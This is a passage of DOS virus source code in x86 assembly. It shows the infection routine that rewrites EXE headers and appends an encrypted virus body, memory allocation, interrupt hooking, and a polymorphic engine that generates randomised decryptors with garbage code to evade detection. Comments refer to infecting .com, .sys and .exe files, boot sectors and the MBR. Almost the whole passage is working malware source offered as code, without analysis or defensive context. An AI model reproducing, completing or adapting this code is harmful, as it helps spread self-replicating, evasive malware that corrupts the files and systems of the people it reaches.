                   mov word ptr cs:[si+0Eh],ax

                   ;Set new stack pointer beyond end of virus
                   add dx,mem_byte_size+inf_byte_size+0410h

                   ;Aligment
                   and dx,0FFFEh
                   mov word ptr cs:[si+10h],dx

                   ;Restore size
                   pop dx
                   pop ax

                   ;Resave size
                   push ax
                   push dx

                   ;Get file size div 0200h
                   mov cx,0200h
                   div cx
                   or dx,dx
                   jz size_round_1
                   inc ax
   size_round_1:
                   ;Check if file size is as header says
                   cmp ax,word ptr cs:[si+04h]
                   jne exit_header
                   cmp dx,word ptr cs:[si+02h]
                   je ok_file_size
   exit_header:
                   pop dx
                   pop ax
   bad_exe:
                   jmp exit_inf
   ok_file_size:
                   ;Restore file size
                   pop dx
                   pop ax

                   ;Add virus size to file size
                   add ax,inf_byte_size
                   adc dx,0000h

                   ;Get infected file size div 0200h
                   mov cx,0200h
                   div cx
                   or dx,dx
                   jz size_round_2
                   inc ax
   size_round_2:
                   ;Store new size
                   mov word ptr cs:[si+02h],dx
                   mov word ptr cs:[si+04h],ax

                   ;Store return subroutine
                   mov word ptr cs:[exit_address],offset exit_exe - \
                                                  offset host_ret

                   ;Encryption an infection continues on next routine

   ;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
   ;³Encryption and infection                                                  ³
   ;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ

   get_control:
                   ;Reserve memory for poly engine buffer
                   call memory_allocation
                   jc no_good_memory

                   ;Encrypt virus and build polymorphic decryptor
                   sub bp,bp
                   call do_encrypt

                   ;Write virus body to the end of file
                   mov ah,40h
                   mov cx,inf_byte_size
                   lds dx,dword ptr cs:[poly_working_ptr]
                   call dos_call
                   jc no_good_write

                   ;Seek to beginning of file
                   call seek_begin

                   ;Write new header
                   push cs
                   pop ds
                   mov ah,40h
                   mov cx,file_header_size
                   mov dx,offset file_buffer
                   call dos_call

                   ;Mark file as infected
                   or byte ptr es:[di+0Dh],1Fh
   no_good_write:
                   ;Free previous allocated memory
                   call free_memory
   no_good_memory:
                   jmp exit_inf

   ;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
   ;³Memory allocation routine                                                 ³
   ;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ

   memory_allocation:
                   ;Save regs
                   call push_all

                   ;Use segment as success flag
                   mov word ptr cs:[poly_working_seg],0000h

                   ;Get and save memory allocation strategy
                   mov ax,5800h
                   call dos_call
                   push ax

                   ;Set new allocation strategy to first fit in high then low
                   mov ax,5801h
                   mov bx,0080h
                   call dos_call

                   ;Get and save umb link state
                   mov ax,5802h
                   call dos_call
                   xor ah,ah
                   push ax

                   ;Set umb link state on
                   mov ax,5803h
                   mov bx,0001h
                   call dos_call

                   ;Allocate memory
                   mov ah,48h
                   mov bx,inf_para_size
                   call dos_call
                   jc error_mem_alloc

                   ;Save pointer to allocated memory
                   mov word ptr cs:[poly_working_off],0000h
                   mov word ptr cs:[poly_working_seg],ax
   error_mem_alloc:
                   ;Restore umb link state
                   mov ax,5803h
                   pop bx
                   call dos_call

                   ;Restore allocation strategy
                   mov ax,5801h
                   pop bx
                   call dos_call

                   ;Check segment
                   cmp word ptr cs:[poly_working_seg],0000h
                   je exit_mem_error

                   ;Restore regs
                   call pop_all
                   clc
                   ret

   exit_mem_error:

                   ;Restore regs
                   call pop_all
                   stc
                   ret

   ;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
   ;³Free previous allocated memory                                            ³
   ;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ

   free_memory:
                   call push_all
   free_try_again:
                   mov ah,49h
                   mov es,word ptr cs:[poly_working_seg]
                   call dos_call
                   jc free_try_again
                   call pop_all
                   ret

   ;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
   ;³Get random number from our rnd buffer                                     ³
   ;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ

   get_rnd:
                   push si
                   push ds
                   push cs
                   pop ds
                   mov ax,word ptr cs:[rnd_pointer][bp]
                   mov si,ax
                   sub ax,bp
                   cmp ax,decryptor-04h
                   jbe into_random_data
                   mov si,bp

   into_random_data:

                   cld
                   lodsw
                   mov word ptr cs:[rnd_pointer][bp],si
                   pop ds
                   pop si
                   ret

   ;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
   ;³Timer based random number generator                                       ³
   ;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ

   random_number:
                   push cx
                   in ax,40h
                   mov cl,al
                   xor al,ah
                   xor ah,cl
                   xor ax,0FFFFh
                   org $-02h
   randomize:
                   dw 0000h
                   mov word ptr cs:[randomize][bp],ax
                   pop cx
                   ret

   ;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
   ;³Generate a 16bit random number                                            ³
   ;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ

   rand_16:
                   call get_rnd
                   mov bl,al
                   call get_rnd
                   mov ah,bl
                   ret

   ;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
   ;³Generate a random number betwin 0 and ax                                  ³
   ;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ

   rand_in_range:

                   ;Returns a random num between 0 and entry ax
                   push bx
                   push dx
                   xchg ax,bx
                   call get_rnd
                   xor dx,dx
                   div bx

                   ;Remainder in dx
                   xchg ax,dx
                   pop dx
                   pop bx
                   ret

   ;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
   ;³Return the al vector in es:bx                                             ³
   ;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ

   get_int:
                   push ax
                   xor ah,ah
                   rol ax,1
                   rol ax,1
                   xchg bx,ax
                   xor ax,ax
                   mov es,ax
                   les bx,dword ptr es:[bx+00h]
                   pop ax
                   ret

   ;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
   ;³Set al interrupt vector to ds:dx pointer                                  ³
   ;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ

   set_int:
                   push ax
                   push bx
                   push ds
                   cli
                   xor ah,ah
                   rol ax,1
                   rol ax,1
                   xchg ax,bx
                   push ds
                   xor ax,ax
                   mov ds,ax
                   mov word ptr ds:[bx+00h],dx
                   pop word ptr ds:[bx+02h]
                   sti
                   pop ds
                   pop bx
                   pop ax
                   ret

   ;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
   ;³Get sft address in es:di                                                  ³
   ;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ

   get_sft:
                   ;File handle in bx
                   push bx

                   ;Get job file table entry to es:di
                   mov ax,1220h
                   int 2Fh
                   jc error_sft

                   ;Exit if handle not opened
                   xor bx,bx
                   mov bl,byte ptr es:[di+00h]
                   cmp bl,0FFh
                   je error_sft

                   ;Get address of sft entry number bx to es:di
                   mov ax,1216h
                   int 2Fh
                   jc error_sft
                   pop bx
                   clc
                   ret

   error_sft:
                   ;Exit with error
                   pop bx
                   stc
                   ret

   ;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
   ;³Seek to end of file                                                       ³
   ;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ

   seek_end:
                   call get_sft
                   mov ax,word ptr es:[di+11h]
                   mov dx,word ptr es:[di+13h]
                   mov word ptr es:[di+17h],dx
                   mov word ptr es:[di+15h],ax
                   ret

   ;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
   ;³Seek to begin                                                             ³
   ;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ

   seek_begin:
                   call get_sft
                   xor ax,ax
                   mov word ptr es:[di+17h],ax
                   mov word ptr es:[di+15h],ax
                   ret

   ;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
   ;³Virus critical error interrupt handler ( int 24h )                        ³
   ;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ

   my_int24h:
                   sti
                   ;Return error in function
                   mov al,03h
                   iret

   ;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
   ;³Save all registers in the stack                                           ³
   ;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ

   push_all:
                   cli
                   pop word ptr cs:[ret_off]
                   pushf
                   push ax
                   push bx
                   push cx
                   push dx
                   push bp
                   push si
                   push di
                   push es
                   push ds
                   push word ptr cs:[ret_off]
                   sti
                   ret

   ;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
   ;³Restore all registers from the stack                                      ³
   ;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ

   pop_all:
                   cli
                   pop word ptr cs:[ret_off]
                   pop ds
                   pop es
                   pop di
                   pop si
                   pop bp
                   pop dx
                   pop cx
                   pop bx
                   pop ax
                   popf
                   push word ptr cs:[ret_off]
                   sti
                   ret

   ;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
   ;³Unhook int 24h and clear dos infection switch                             ³
   ;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ

   unhook_ints:
                   push ds
                   push dx
                   push ax

                   ;Clear dos running switch
                   mov byte ptr cs:[running_sw],00h

                   ;Restore int 24h
                   lds dx,dword ptr cs:[old24h]
                   mov al,24h
                   call set_int

                   pop ax
                   pop dx
                   pop ds
                   ret

   ;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
   ;³Perform a call to dos function                                            ³
   ;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ

   dos_call:
                   pushf
                   call dword ptr cs:[org21h]
                   ret

   ;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
   ;³Get position of code inserted into boot sector                            ³
   ;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ

   get_position:
                   push cx

                   ;Point di to offset in buffer
                   mov di,bx

                   ;Get displacement
                   mov cx,word ptr es:[bx+01h]
                   mov al,byte ptr es:[bx]

                   ;Check for short jump
                   cmp al,0EBh
                   jne check_jump

                   ;Store 8bit displacement
                   xor ch,ch
                   jmp short add_offset
   check_jump:
                   ;Check for near jump
                   cmp al,0E9h
                   jne no_displacement
   add_offset:
                   inc cx
                   inc cx
                   add di,cx
   no_displacement:
                   pop cx
                   ret

   ;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
   ;³Make a copy of file header                                                ³
   ;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ

   copy_header:
                   ;Copy header to buffer
                   push si
                   push di
                   push cx
                   push cs
                   pop es
                   mov si,offset file_buffer
                   mov di,offset old_header
                   mov cx,file_header_size
                   cld
                   rep movsb
                   pop cx
                   pop di
                   pop si
                   ret

   ;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
   ;³Decrypt header                                                            ³
   ;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ

   decrypt_header:

                   mov cx,file_header_size
                   push dx
                   pop si
                   mov al,byte ptr cs:[si+file_header_size]
   restore_header:
                   sub byte ptr cs:[si+00h],al
                   inc si
                   loop restore_header
                   ret

   ;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
   ;³Print string while producing some beeps                                   ³
   ;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ

   loop_beep_string:

                   ;Get character
                   lodsb
                   or al,al
                   jnz print_that_char
                   ret

   print_that_char:
                   ;Print character
                   mov ah,09h
                   mov bx,0002h
                   mov cx,0001h
                   push si
                   int 10h

                   ;Produce a click
                   call generate_beep

                   ;Move cursor to next position
                   mov ah,03h
                   xor bh,bh
                   int 10h
                   inc dl
                   mov ah,02h
                   int 10h
                   pop si
                   jmp loop_beep_string

   ;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
   ;³Generate a speaker beep                                                   ³
   ;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ

   generate_beep:

                   mov cx,0008h
   loop_click:
                   push cx

                   ;Get attention of the 8253
                   mov al,0B6h
                   out 043h,al

                   ;Sent frequency
                   xor ax,ax
                   dec ax
                   out 042h,al
                   mov al,ah
                   out  042h,al

                   ;Send signal to speaker
                   in al,61h
                   or al,03h
                   out 061h,al

                   ;Sound duration
                   mov cx,0FFFFh
   wait_cycle:
                   loop wait_cycle

                   ;Clear signal
                   in al,061h
                   and al,0FCh
                   out 061h,al
                   pop cx
                   loop loop_click
                   ret

   ;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
   ;³Polymorphic engine                                                        ³
   ;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ

   do_encrypt:
                   push ax
                   push bx
                   push cx
                   push dx
                   push si
                   push di
                   push ds
                   push es

                   ;Reset pointer to random data
                   mov word ptr cs:[rnd_pointer][bp],bp

   try_new_generation:

                   ;Initialize engine
                   xor ax,ax
                   lea di,word ptr [poly_data][bp]

                   ;Clear last_subrotine
                   mov word ptr cs:[di+04h],ax

                   ;Clear decrypt_sub
                   mov word ptr cs:[di+06h],ax

                   ;Clear last_fill_type
                   mov word ptr cs:[di],ax
                   dec ax

                   ;Clear last_step_type
                   mov word ptr cs:[di+02h],ax

                   ;Clear last_int_type
                   mov byte ptr cs:[di+0Ah],al

                   ;Clear decrypt_pointer
                   mov byte ptr cs:[di+0Bh],al

                   ;Get base address for memory operations
                   mov ax,offset virus_copy
                   add ax,word ptr cs:[file_delta][bp]
                   mov word ptr cs:[di+12h],ax

                   ;Choose counter and pointer register
                   call get_rnd
                   and al,01h
                   mov byte ptr cs:[di+0Ch],al
   get_si_di_off:
                   ;Choose displacement from / to encrypted code
                   call get_rnd
                   or al,al
                   jz get_si_di_off
                   mov byte ptr cs:[di+14h],al

                   ;Choose type of decrypt sequence
                   call get_rnd
                   and al,01h
                   mov byte ptr cs:[di+15h],al

   get_decrypt_reg:

                   ;Choose register for decryption instructions
                   call get_rnd
                   and al,38h

                   ;Do not use bl or bh into .sys decryptors
                   cmp word ptr cs:[exit_address][bp],offset exit_com - \
                                                      offset host_ret
                   je ok_decrypt_reg

                   ;Check if it is bl
                   cmp al,18h
                   je get_decrypt_reg

                   ;Check if it is bh
                   cmp al,38h
                   je get_decrypt_reg

   ok_decrypt_reg:

                   mov byte ptr cs:[di+0Dh],al

                   ;Choose segment registers for memory operations
                   call get_seg_reg
                   mov byte ptr cs:[di+0Eh],al
                   call get_seg_reg
                   mov byte ptr cs:[di+0Fh],al
   get_rnd_key:

                   ;Get random crypt value
                   call get_rnd
                   or al,al
                   jz get_rnd_key
                   xchg bx,ax
                   mov byte ptr cs:[clave_crypt][bp],bl

                   ;Fill our buffer with garbage
                   push cs
                   pop ds
                   mov es,word ptr cs:[poly_working_seg][bp]
                   mov di,word ptr cs:[poly_working_off][bp]
                   push di
                   mov cx,decryptor
                   cld
   fill_rnd_2:
                   call get_rnd
                   stosb
                   loop fill_rnd_2
                   pop di
                   ;Now es:di points to the buffer were engine put polymorphic code
   choose_type:
                   ;Select the type of filler
                   mov ax,(end_step_table-step_table)/02h
                   call rand_in_range

                   ;Avoid same types in a row
                   cmp ax,word ptr cs:[last_step_type][bp]
                   je choose_type
                   mov word ptr cs:[last_step_type][bp],ax

                   ;Get displacement into subroutine table
                   add ax,ax
                   add ax,bp
                   mov bx,ax

                   ;Get subroutine address
                   mov ax,word ptr cs:[step_table+bx]

                   ;Add delta offset
                   add ax,bp

                   ;Save return address
                   lea bx,word ptr [step_return][bp]
                   push bx

                   ;Save subroutine address
                   push ax

                   ;This is for later operations
                   cld
                   ret
   step_return:
                   ;Check decryptor size
                   mov ax,di
                   sub ax,word ptr cs:[poly_working_off][bp]
                   cmp ax,decryptor
                   jb check_decryptor_ready
                   jmp try_new_generation

   check_decryptor_ready:

                   ;Check if decrytor already build
                   cmp byte ptr cs:[decrypt_pointer][bp],04h
                   jne choose_type

                   ;Generate some garbage
                   call g_generator

                   ;Generate a jump to virus body
                   mov al,0E9h
                   stosb
                   mov ax,decryptor
                   mov cx,word ptr cs:[poly_working_off][bp]
                   dec cx
                   dec cx
                   mov bx,di
                   sub bx,cx
                   sub ax,bx
                   stosw

                   ;Copy virus body to the working area
                   lea si,word ptr [virus_body][bp]
                   mov di,word ptr cs:[poly_working_off][bp]
                   add di,decryptor
                   push di
                   mov cx,inf_byte_size-decryptor
                   cld
                   rep movsb

                   ;Generate second encryption layer
                   mov ax,word ptr cs:[poly_working_off][bp]
                   mov bl,byte ptr cs:[clave_crypt][bp]
                   push bx
                   add ax,second_size
                   push es
                   pop ds
                   mov si,ax
                   mov di,ax
                   mov cx,inf_byte_size-(second_size+01h)

   generate_second:

                   lodsb
                   add al,bl
                   stosb
                   inc bl
                   loop generate_second

                   ;Generate polymorphic encryption
                   pop bx
                   pop di
                   mov si,di
                   mov cx,inf_byte_size-(decryptor+file_header_size+01h)

                   ;Clear prefetch
                   db 0EBh,00h
   load_crypt:
                   lodsb
   encrypt_here:
                   ;Encrypt instruction ( add/sub/xor al,bl )
                   db 00h,0C3h
                   stosb
                   loop load_crypt

                   ;Restore all regs and return to infection routine
                   pop es
                   pop ds
                   pop di
                   pop si
                   pop dx
                   pop cx
                   pop bx
                   pop ax
                   ret

   ;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
   ;³Get a valid opcode for memory operations                                  ³
   ;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ

   get_seg_reg:
                   cmp word ptr cs:[exit_address][bp],offset exit_com - \
                                                      offset host_ret
                   je use_ds_es

                   ;Use just cs on .sys .exe files and floppy boot and hd mbr
                   mov al,2Eh
                   ret
   use_ds_es:
                   ;Use also ds es in .com files
                   call get_rnd
                   and al,18h
                   cmp al,10h
                   je get_seg_reg
                   or al,26h
                   ret

   ;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
   ;³Generate next decryptor instruction                                       ³
